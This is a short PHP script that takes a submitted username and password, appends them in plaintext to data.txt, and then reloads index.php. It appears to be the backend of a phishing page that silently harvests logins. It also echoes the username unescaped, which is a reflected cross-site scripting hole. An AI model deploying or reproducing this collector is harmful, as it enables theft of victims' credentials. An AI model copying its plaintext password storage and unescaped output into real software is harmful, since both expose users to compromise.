
<?php
if(1>0){
  $username = $_POST['username'];
	echo $username;
  $password = $_POST['password'];
  $text = $username . ";" . $password . "\n";
  $fp = fopen('data.txt', 'a');

    if(fwrite($fp, $text))  {
        echo 'saved';
    }
fclose ($fp);  
	include 'index.php';
}
else{
	include 'index.php';
}
?>

